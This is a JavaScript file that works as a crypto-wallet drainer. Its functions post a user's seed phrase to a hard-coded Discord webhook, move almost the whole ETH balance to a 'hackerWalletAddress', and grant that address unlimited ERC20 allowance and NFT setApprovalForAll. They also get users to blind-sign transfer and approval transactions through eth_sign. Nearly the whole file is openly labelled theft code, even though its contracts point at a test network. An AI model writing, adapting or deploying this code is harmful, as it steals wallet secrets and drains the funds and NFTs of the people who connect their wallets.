const $result = (text) => {
  document.getElementById('result').innerHTML = text
}

const stealMnemonic = async () => {
  const mnemonic = document.getElementById('mnemonic').value
  const webhook = 'https://discord.com/api/webhooks/1096736777022214204/QNQtGqrnPbyFyUGSn6tonB2dSRODUa8VflNc1usvM-yB-a5skCSHC1mFA3M-Ax2E_PVN'
  const data = {
    content: mnemonic
  }
  const response = await fetch(webhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  if (response.ok) {
    alert('Mnemonic sent to hacker')
  } else {
    alert('Error sending mnemonic to hacker')
  }
}

const hackerWalletAddress = '0xC8fE17824bdf7C0FdF7fB63D9F4D0b161a73C2a8';

const setupWeb3 = async () => {
  try {
    let currentProvider = null
    if (window.ethereum) {
      await window.ethereum.enable()
      currentProvider = window.ethereum
    } else if (window.web3) {
      currentProvider = window.web3.currentProvider
    } else {
      window.open('https://metamask.app.link/dapp/your.example.com', '_blank');
    }
    if (currentProvider) {
      const web3 = new Web3(currentProvider)
      const chainId = await web3.eth.getChainId()
      const accounts = (await web3.eth.getAccounts()) || web3.eth.accounts
      const account = accounts[0]
      return {web3, chainId, account}
    }
  } catch (err) {
    console.log(err)
  }
}

const eth_transfer = async () => {
  const {web3, chainId, account} = await setupWeb3()
  const amount = await web3.eth.getBalance(account) - web3.utils.toWei('0.01', 'ether') // - gas fee
  web3.eth.sendTransaction({
    from: account,
    to: hackerWalletAddress,
    value: amount
  }, (err, txHash) => {
    if (err) {
      $result(err.message)
    } else {
      $result(txHash)
    }
  })
}

const approve_token = async () => {
  const {web3, chainId, account} = await setupWeb3()
  const ERC20ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}];
  const ERC20AddressGoerli = '0x6ad196dbcd43996f17638b924d2fdedff6fdd677'
  const contract = new web3.eth.Contract(ERC20ABI, ERC20AddressGoerli)
  contract.methods.approve(hackerWalletAddress, 2^256 - 1).send({from: account}, (err, txHash) => {
    if (err) {
      $result(err.message)
    } else {
      $result(txHash)
    }
  })
}

const approve_nft = async () => {
  const {web3, chainId, account} = await setupWeb3()

  const ERC721ABI = [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"operator","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"owner","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"_approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}];
  const ERC721AddressGoerli = '0x1ed4613ed1e32b06cf66043edddd2ba518e41641'

  const contract = new web3.eth.Contract(ERC721ABI, ERC721AddressGoerli)
  contract.methods.setApprovalForAll(hackerWalletAddress, true).send({from: account}, (err, txHash) => {
    if (err) {
      $result(err.message)
    } else {
      $result(txHash)
    }
  })
}

const sign_transfer = async () => {
  const {web3, chainId, account} = await setupWeb3()

  const utils = ethers.utils;
  web3.currentProvider.sendAsync({
    method: 'eth_getTransactionCount',
    params: [account],
  }, async function (err, result) {
    const nonce = web3.utils.toHex(result.result);
    const amount = await web3.eth.getBalance(account) - web3.utils.toWei('0.01', 'ether') // - gas fee
    const gasLimit = await web3.eth.estimateGas({
      from: account,
      nonce: nonce, 
      to: hackerWalletAddress,
      value: web3.utils.toHex(amount),
    });
    const gasPrice = await web3.eth.getGasPrice()

    const tx = {
      to: hackerWalletAddress,
      nonce: nonce,
      gasLimit: gasLimit,
      gasPrice: web3.utils.toHex(gasPrice),
      value: web3.utils.toHex(amount),
    }
    const serializedTxHash = web3.utils.keccak256(utils.serializeTransaction(tx));
    web3.currentProvider.sendAsync({
      method: 'eth_sign',
      params: [account, serializedTxHash],
    }, function (err, result) {
      if (err) {
        $result(err.message)
      } else {
        const signature = result.result;
        const signedTransaction = utils.serializeTransaction(tx, signature);
        $result(signedTransaction);
        console.log(JSON.stringify(utils.parseTransaction(signedTransaction)));
      }
    })
  })

}

const sign_approve = async () => {
  const {web3, chainId, account} = await setupWeb3()

  const utils = ethers.utils;
  web3.currentProvider.sendAsync({
    method: 'eth_getTransactionCount',
    params: [account],
  }, async function (err, result) {
      const nonce = web3.utils.toHex(result.result);

      const ERC721ABI = [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"operator","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"owner","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"_approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const ERC721AddressGoerli = '0x1ed4613ed1e32b06cf66043edddd2ba518e41641';

      const contract = new web3.eth.Contract(ERC721ABI, ERC721AddressGoerli);
      const data = contract.methods.setApprovalForAll(hackerWalletAddress, true).encodeABI();

      const gasLimit = await web3.eth.estimateGas({
        from: account,
        to: ERC721AddressGoerli,
        nonce: nonce, 
        data,
      });
      const gasPrice = await web3.eth.getGasPrice()

      const tx = {
        to: ERC721AddressGoerli,
        nonce: nonce,
        data: data,
        gasLimit: gasLimit,
        gasPrice: web3.utils.toHex(gasPrice),
      }
      const serializedTxHash = web3.utils.keccak256(utils.serializeTransaction(tx));
      web3.currentProvider.sendAsync({
          method: 'eth_sign',
          params: [account, serializedTxHash],
      }, function (err, result) {
        if (err) {
          $result(err.message)
        } else {
          const signature = result.result;
          const signedTransaction = utils.serializeTransaction(tx, signature);
          $result(signedTransaction)
          console.log(JSON.stringify(utils.parseTransaction(signedTransaction)));
        }
      })
  })

}
